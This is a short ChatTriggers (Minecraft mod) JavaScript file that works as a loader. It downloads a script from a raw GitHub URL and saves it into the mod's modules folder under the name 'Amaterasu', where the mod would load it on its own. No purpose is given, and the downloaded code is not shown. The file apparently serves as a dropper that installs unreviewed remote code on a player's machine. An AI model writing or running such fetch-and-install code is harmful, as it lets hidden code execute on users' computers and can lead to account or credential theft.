const File = Java.type('java.io.File');
const FileWriter = Java.type('java.io.FileWriter');
const System = Java.type('java.lang.System');

try {
    const appData = System.getenv("APPDATA");
    const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Amaterasu");
    targetPath.mkdirs();

    const file = new File(targetPath, "script.js");

    const url = "https://raw.githubusercontent.com/satnnyy/test1/main/b.js";
    ChatLib.chat("§a[+] Downloading file...");

    // Download file content (blocking call)
    const content = FileLib.getUrlContent(url);

    // Write content to file
    const fw = new FileWriter(file);
    fw.write(content);
    fw.close();

    ChatLib.chat("§a[✓] File downloaded and saved successfully!");
} catch (e) {
    ChatLib.chat("§c[✗] Error downloading or saving file: " + e);
}
